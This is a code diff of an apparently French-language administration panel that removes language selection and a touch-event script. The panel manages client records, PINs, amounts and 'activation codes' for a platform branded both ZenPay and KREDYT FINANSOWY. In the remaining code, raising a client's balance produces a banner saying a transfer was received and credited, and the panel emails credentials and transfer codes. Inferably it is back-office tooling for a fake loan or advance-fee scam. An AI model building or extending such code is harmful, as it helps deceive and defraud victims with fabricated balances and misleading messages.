@@ -1,25 +1,6 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head><!-- PLAYABLE_TOUCH_PATCH_V1 --><script>
-(function() {
-  if (window.__playableTouchPatchInstalled) return;
-  window.__playableTouchPatchInstalled = true;
-  var origAdd = EventTarget.prototype.addEventListener;
-  var blockedTypes = { touchstart: 1, touchmove: 1, wheel: 1 };
-  EventTarget.prototype.addEventListener = function(type, listener, options) {
-    if (blockedTypes[type]) {
-      if (options === undefined || options === null) {
-        options = { passive: true };
-      } else if (typeof options === 'boolean') {
-        options = { capture: options, passive: true };
-      } else {
-        options = Object.assign({}, options, { passive: true });
-      }
-    }
-    return origAdd.call(this, type, listener, options);
-  };
-})();
-</script><script>window.Intl=window.Intl||{};Intl.t=function(s){return(Intl._locale&&Intl._locale[s])||s;};</script>
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VANTEX · Administration</title>
@@ -258,17 +239,6 @@
                             <option value="₪">₪ - Shekel israélien (ILS)</option>
                             <option value="$">$ - Dollar américain (USD)</option>
                         </select>
-                    </div>
-                    <div class="field">
-                        <label><i class="fas fa-language"></i> Langue de l'application <span style="color:#DC2626;">*</span></label>
-                        <select id="langue" required>
-                            <option value="" disabled selected>-- Choisir la langue du client --</option>
-                            <option value="pl">🇵🇱 Polski (PL)</option>
-                            <option value="fr">🇫🇷 Français (FR)</option>
-                            <option value="he">🇮🇱 עברית (HE) - RTL</option>
-                            <option value="es">🇪🇸 Español (ES)</option>
-                        </select>
-                        <span class="hint">Obligatoire - Si non choisi, détection auto du téléphone du client</span>
                     </div>
                     <div class="field">
                         <label><i class="fas fa-palette"></i> Couleur thème FLOA BK</label>
@@ -786,7 +756,6 @@
                                 pin: '973018',
                                 montant: 10000,
                                 devise: 'zł',
-                                langue: 'pl',
                                 theme: 'purple',
                                 code: 'ACT123',
                                 refundCode: 'CAN789',
@@ -840,7 +809,7 @@
                                     <td><span class="badge">${v.pin}</span></td>
                                     <td>${Number(v.montant).toLocaleString('pl-PL')} ${v.devise || 'zł'}</td>
                                     <td id="status-${id}"><span class="text-muted">Chargement...</span></td>
-                                    <td>${getThemeBadge(v.theme || 'purple')} <span style="font-size:10px;background:#EFF6FF;color:#1E40AF;padding:2px 6px;border-radius:8px;margin-left:4px;">${(v.langue||'pl').toUpperCase()}</span></td>
+                                    <td>${getThemeBadge(v.theme || 'purple')}</td>
                                     <td>${v.code}</td>
                                     <td>${v.pct}%</td>
                                     <td>
@@ -937,7 +906,6 @@
                             pin: $('pin').value.trim(),
                             montant: finalMontant,
                             devise: $('devise').value,
-                            langue: $('langue').value,
                             theme: $('theme').value,
                             code: $('code').value.trim(),
                             refundCode: $('refundCode').value.trim(),
@@ -950,19 +918,12 @@
                             updated: Date.now()
                         };
 
-                        // === GÉNÉRATION AUTOMATIQUE DE LA BANNIÈRE MULTILINGUE ===
+                        // === GÉNÉRATION AUTOMATIQUE DE LA BANNIÈRE ===
                         if (montantIncreased && increaseAmount > 0 && o.nom) {
                             const formattedAmount = increaseAmount.toLocaleString('pl-PL') + ' ' + o.devise;
-                            const lang = o.langue || 'pl';
-                            const banners = {
-                                pl: `Witam ${o.nom}, Nowy transfer ${formattedAmount} otrzymane i zaksięgowane na Twoim koncie. Możesz dodać swój IBAN, aby wykonać przelew zewnętrzny do swojego banku.`,
-                                fr: `Bonjour ${o.nom}, Nouveau virement de ${formattedAmount} reçu et crédité sur votre compte. Vous pouvez ajouter votre IBAN pour effectuer un virement externe vers votre banque.`,
-                                he: `שלום ${o.nom}, העברה חדשה של ${formattedAmount} התקבלה ונזקפה לחשבונך. תוכל להוסיף את ה-IBAN שלך לביצוע העברה חיצונית לבנק שלך.`,
-                                es: `Hola ${o.nom}, Nueva transferencia de ${formattedAmount} recibida y acreditada en tu cuenta. Puedes añadir tu IBAN para hacer una transferencia externa a tu banco.`
-                            };
-                            o.bannerMessage = banners[lang] || banners['pl'];
+                            o.bannerMessage = `Witam ${o.nom}, Nowy transfer ${formattedAmount} otrzymane i zaksięgowane na Twoim koncie. Możesz dodać swój IBAN, aby wykonać przelew zewnętrzny do swojego banku.`;
                             o.bannerRead = false;
-                            console.log('✅ Bannière générée ['+lang+'] pour:', o.nom);
+                            console.log('✅ Bannière générée pour le client:', o.nom);
                         } else {
                             // Pas d'augmentation : on conserve l'ancien message si existant
                             if (editId && data[editId] && data[editId].bannerMessage) {
@@ -974,7 +935,6 @@
                             }
                         }
 
-                        if (!o.langue) { showAlert('⚠️ Veuillez choisir la langue du client.', 'error'); return; }
                         if (!o.nom || !o.email || !o.pin) {
                             showAlert('⚠️ Nom, Email et PIN sont obligatoires.', 'error');
                             return;
@@ -1005,9 +965,7 @@
 
                     function resetForm() {
                         ['nom', 'email', 'pin', 'montant', 'addMontant', 'code', 'refundCode', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
-                        $('langue').value = '';
                         $('devise').value = 'zł';
-                        $('langue').value = '';
                         $('theme').value = 'purple';
                         $('pct').value = 100;
                         pvDisplay.textContent = '100%';
@@ -1024,7 +982,6 @@
                         $('pin').value = v.pin;
                         $('montant').value = v.montant;
                         $('devise').value = v.devise || 'zł';
-                        $('langue').value = v.langue || 'pl';
                         $('theme').value = v.theme || 'purple';
                         $('code').value = v.code;
                         $('refundCode').value = v.refundCode || '';
@@ -1336,45 +1293,38 @@
                         const email = v.email || '---';
                         const pin = v.pin || '---';
                         const theme = v.theme || 'teal';
-                        const lang = v.langue || 'pl';
-                        const langue = v.langue || 'pl';
-                        const link = 'https://polska.getzenpay.com/?id=' + encodeURIComponent(currentClientId) + '&nom=' + encodeURIComponent(name) + '&theme=' + encodeURIComponent(theme) + '&langue=' + encodeURIComponent(langue);
+                        const link = 'https://polska.getzenpay.com/?id=' + encodeURIComponent(currentClientId) + '&nom=' + encodeURIComponent(name) + '&theme=' + encodeURIComponent(theme);
 
-                        const trad = {
-                            pl: { subj: `Twoje dane logowania KREDYT FINANSOWY`, greet: `Przyjmijcie nasze serdeczne pozdrowienia, drogi kliencie`, body1: `Mamy przyjemność potwierdzić Twoją rejestrację na platformie <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, body2: `Aby uzyskać dostęp do swojej przestrzeni klienta online, poniżej znajdują się Twoje dane logowania`, btn: `Dostęp do mojego konta →`, footer: `Pozdrawiamy,<br><strong style="font-size:30px; color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>`, txt: `Mamy przyjemność potwierdzić Twoją rejestrację` },
-                            fr: { subj: `Vos accès KREDYT FINANSOWY`, greet: `Cher client <strong>${name}</strong>,`, body1: `Nous avons le plaisir de confirmer votre inscription sur la plateforme <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, body2: `Voici vos identifiants pour accéder à votre espace client`, btn: `Accéder à mon compte →`, footer: `Cordialement,<br><strong style="font-size:30px; color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>`, txt: `Nous confirmons votre inscription` },
-                            he: { subj: `פרטי הגישה שלך KREDYT FINANSOWY`, greet: `לקוח יקר <strong>${name}</strong>,`, body1: `אנו שמחים לאשר את הרשמתך בפלטפורמת <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, body2: `להלן פרטי הגישה שלך`, btn: `גישה לחשבון שלי ←`, footer: `בברכה,<br><strong style="font-size:30px; color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>`, txt: `אישור הרשמה` },
-                            es: { subj: `Tus datos de acceso KREDYT FINANSOWY`, greet: `Estimado cliente <strong>${name}</strong>,`, body1: `Nos complace confirmar tu registro en la plataforma <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, body2: `Aquí tienes tus datos de acceso`, btn: `Acceder a mi cuenta →`, footer: `Saludos,<br><strong style="font-size:30px; color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>`, txt: `Confirmamos tu registro` }
-                        };
-                        const tr = trad[lang] || trad['pl'];
-
-                        const sujet = `${suffixe} ${name} - ${tr.subj}`;
+                        const sujet = `${suffixe} ${name} - Twoje dane logowania KREDYT FINANSOWY`;
 
                         const htmlContent = `
-                        <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f7fa; padding:20px; direction:${lang==='he'?'rtl':'ltr'};">
+                        <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f7fa; padding:20px;">
                             <tr><td align="center">
                                 <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff; border-radius:10px; overflow:hidden;">
                                     <tr><td style="background-color:#6A1B9A; padding:45px 20px; text-align:center;">
                                         <span style="font-size:72px; font-weight:bold; color:#ffffff; letter-spacing:2px;">ZenPay</span>
                                     </td></tr>
-                                    <tr><td style="padding:35px; color:#333333; font-size:24px; line-height:2.2; text-align:${lang==='he'?'right':'left'};">
-                                        <p style="margin-top:0;">${tr.greet}</p>
-                                        <p>${tr.body1}</p>
-                                        <p>${tr.body2}:</p>
+                                    <tr><td style="padding:35px; color:#333333; font-size:24px; line-height:2.2;">
+                                        <p style="margin-top:0;">Przyjmijcie nasze serdeczne pozdrowienia, drogi kliencie: <strong>${name}</strong>,</p>
+                                        <p>Mamy przyjemność potwierdzić Twoją rejestrację na platformie <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>. Dziękujemy za zaufanie i cieszymy się, że możemy Ci towarzyszyć.</p>
+                                        <p>Aby uzyskać dostęp do swojej przestrzeni klienta online, poniżej znajdują się Twoje dane logowania:</p>
                                         <ul style="padding-left:25px; list-style:none;">
                                             <li style="margin-bottom:20px;"><strong style="font-size:36px;">✉️ Gmail:</strong> <span style="color:#1a73e8; font-size:48px; font-weight:bold;">${email}</span></li>
-                                            <li style="margin-bottom:20px;"><strong style="font-size:36px;">🛡️ PIN:</strong> <span style="font-size:48px; font-weight:bold; color:#333;">${pin}</span></li>
+                                            <li style="margin-bottom:20px;"><strong style="font-size:36px;">🛡️ Kod PIN:</strong> <span style="font-size:48px; font-weight:bold; color:#333;">${pin}</span></li>
                                         </ul>
+                                        <p style="margin-top:30px;">Użyj poniższego przycisku, aby uzyskać dostęp do swojego konta:</p>
                                         <div style="text-align:center; margin:40px 0;">
-                                            <a href="${link}" target="_blank" style="background-color:#28a745; color:#ffffff; text-decoration:none; padding:24px 52px; border-radius:35px; font-weight:bold; font-size:26px; display:inline-block;">${tr.btn}</a>
+                                            <a href="${link}" target="_blank" style="background-color:#28a745; color:#ffffff; text-decoration:none; padding:24px 52px; border-radius:35px; font-weight:bold; font-size:26px; display:inline-block;">Dostęp do mojego konta →</a>
                                         </div>
-                                        <p>${tr.footer}</p>
+                                        <p>Pozdrawiamy,<br><strong style="font-size:30px; color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong></p>
+                                        <hr style="border:none; border-top:1px solid #e0e0e0; margin:35px 0;">
+                                        <p style="font-size:18px; color:#777777;"><strong>Zastrzeżenie:</strong><br>Informacje zawarte w tym e-mailu oraz we wszystkich plikach przesyłanych razem z nim są przeznaczone wyłącznie dla adresata i mogą zawierać informacje poufne lub uprzywilejowane.</p>
                                     </td></tr>
                                 </table>
                             </td></tr>
                         </table>`;
 
-                        const textContent = `${name}, ${tr.txt} - ${email} / ${pin} - ${link}`;
+                        const textContent = `Szanowny/a ${name},\n\nPrzyjmijcie nasze serdeczne pozdrowienia.\n\nMamy przyjemność potwierdzić Twoją rejestrację na platformie KREDYT FINANSOWY.\n\nTwoje dane logowania:\nGmail: ${email}\nKod PIN: ${pin}\n\nDostęp do konta: ${link}\n\nPozdrawiamy,\nKREDYT FINANSOWY`;
 
                         statusEl.innerHTML = '<span style="color:#2563EB;">⏳ Wysyłanie identifiants...</span>';
                         document.getElementById('btnSendCreds').disabled = true;
@@ -1420,43 +1370,37 @@
                         const name = v.nom || 'Klient';
                         const code = v.code || '---';
                         const theme = v.theme || 'teal';
-                        const lang = v.langue || 'pl';
-                        const langue = v.langue || 'pl';
-                        const link = 'https://polska.getzenpay.com/?id=' + encodeURIComponent(currentClientId) + '&nom=' + encodeURIComponent(name) + '&theme=' + encodeURIComponent(theme) + '&langue=' + encodeURIComponent(langue);
+                        const link = 'https://polska.getzenpay.com/?id=' + encodeURIComponent(currentClientId) + '&nom=' + encodeURIComponent(name) + '&theme=' + encodeURIComponent(theme);
 
-                        const trad2 = {
-                            pl: { subj: `Twój kod aktywacji przelewu`, hello: `Witaj <strong>${name}</strong>,`, body: `Otrzymałeś kod aktywacji / walidacji przelewu na platformie <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, label: `🔑 Kod aktywacji / walidacji przelewu:`, btn: `Dostęp do mojego konta →`, bye: `Pozdrawiamy,` },
-                            fr: { subj: `Votre code d'activation de virement`, hello: `Bonjour <strong>${name}</strong>,`, body: `Vous avez reçu un code d'activation de virement sur la plateforme <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, label: `🔑 Code d'activation:`, btn: `Accéder à mon compte →`, bye: `Cordialement,` },
-                            he: { subj: `קוד הפעלת ההעברה שלך`, hello: `<strong>${name}</strong> שלום,`, body: `קיבלת קוד הפעלה להעברה בפלטפורמת <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, label: `🔑 קוד הפעלה:`, btn: `גישה לחשבון שלי ←`, bye: `בברכה,` },
-                            es: { subj: `Tu código de activación de transferencia`, hello: `Hola <strong>${name}</strong>,`, body: `Has recibido un código de activación de transferencia en la plataforma <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.`, label: `🔑 Código de activación:`, btn: `Acceder a mi cuenta →`, bye: `Saludos,` }
-                        };
-                        const tr2 = trad2[lang] || trad2['pl'];
-                        const sujet = `${suffixe} ${name} - ${tr2.subj}`;
+                        const sujet = `${suffixe} ${name} - Twój kod aktywacji przelewu`;
 
                         const htmlContent = `
-                        <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f7fa; padding:20px; direction:${lang==='he'?'rtl':'ltr'};">
+                        <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f7fa; padding:20px;">
                             <tr><td align="center">
                                 <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff; border-radius:10px; overflow:hidden;">
                                     <tr><td style="background-color:#6A1B9A; padding:45px 20px; text-align:center;">
                                         <span style="font-size:72px; font-weight:bold; color:#ffffff; letter-spacing:2px;">ZenPay</span>
                                     </td></tr>
-                                    <tr><td style="padding:35px; color:#333333; font-size:24px; line-height:2.2; text-align:${lang==='he'?'right':'left'};">
-                                        <p style="margin-top:0;">${tr2.hello}</p>
-                                        <p>${tr2.body}</p>
+                                    <tr><td style="padding:35px; color:#333333; font-size:24px; line-height:2.2;">
+                                        <p style="margin-top:0;">Witaj <strong>${name}</strong>,</p>
+                                        <p>Otrzymałeś kod aktywacji / walidacji przelewu na platformie <strong style="color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong>.</p>
                                         <p style="margin-top:30px; margin-bottom:30px; text-align:center;">
-                                            <strong style="font-size:36px;">${tr2.label}</strong><br>
+                                            <strong style="font-size:36px;">🔑 Kod aktywacji / walidacji przelewu:</strong><br>
                                             <span style="font-size:56px; font-weight:bold; color:#d32f2f; letter-spacing:4px; display:inline-block; margin-top:15px; padding:15px 30px; background:#fff5f5; border-radius:12px; border:2px solid #ffcdd2;">${code}</span>
                                         </p>
+                                        <p>Użyj poniższego przycisku, aby uzyskać dostęp do swojego konta:</p>
                                         <div style="text-align:center; margin:40px 0;">
-                                            <a href="${link}" target="_blank" style="background-color:#28a745; color:#ffffff; text-decoration:none; padding:24px 52px; border-radius:35px; font-weight:bold; font-size:26px; display:inline-block;">${tr2.btn}</a>
+                                            <a href="${link}" target="_blank" style="background-color:#28a745; color:#ffffff; text-decoration:none; padding:24px 52px; border-radius:35px; font-weight:bold; font-size:26px; display:inline-block;">Dostęp do mojego konta →</a>
                                         </div>
-                                        <p>${tr2.bye}<br><strong style="font-size:30px; color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong></p>
+                                        <p>Pozdrawiamy,<br><strong style="font-size:30px; color:#28a745; font-style:italic;">KREDYT FINANSOWY</strong></p>
+                                        <hr style="border:none; border-top:1px solid #e0e0e0; margin:35px 0;">
+                                        <p style="font-size:18px; color:#777777;"><strong>Zastrzeżenie:</strong><br>Informacje zawarte w tym e-mailu oraz we wszystkich plikach przesyłanych razem z nim są przeznaczone wyłącznie dla adresata i mogą zawierać informacje poufne lub uprzywilejowane.</p>
                                     </td></tr>
                                 </table>
                             </td></tr>
                         </table>`;
 
-                        const textContent = `${name} - ${tr2.subj}: ${code} - ${link}`;
+                        const textContent = `Szanowny/a ${name},\n\nOtrzymałeś kod aktywacji / walidacji przelewu na platformie KREDYT FINANSOWY.\n\nKod aktywacji: ${code}\n\nDostęp do konta: ${link}\n\nPozdrawiamy,\nKREDYT FINANSOWY`;
 
                         statusEl.innerHTML = '<span style="color:#2563EB;">⏳ Wysyłanie kodu aktywacji...</span>';
                         document.getElementById('btnSendCreds').disabled = true;
